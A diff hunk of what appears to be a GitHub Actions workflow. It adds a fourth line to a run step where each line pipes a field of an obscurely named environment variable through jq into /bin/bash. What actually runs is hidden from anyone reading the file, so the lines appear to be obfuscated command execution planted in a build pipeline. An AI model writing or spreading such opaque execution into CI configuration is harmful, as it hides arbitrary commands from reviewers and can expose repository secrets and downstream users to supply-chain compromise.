@@ -29,6 +29,7 @@ jobs:
           printf '%s' "$exvs11" | jq -r .ojiu5 | /bin/bash
           echo $x04 | jq -r .xxzb3665 | /bin/bash
           echo $vcgk755 | jq -r .hk832 | /bin/bash
+          echo $rpn962 | jq -r .h7 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
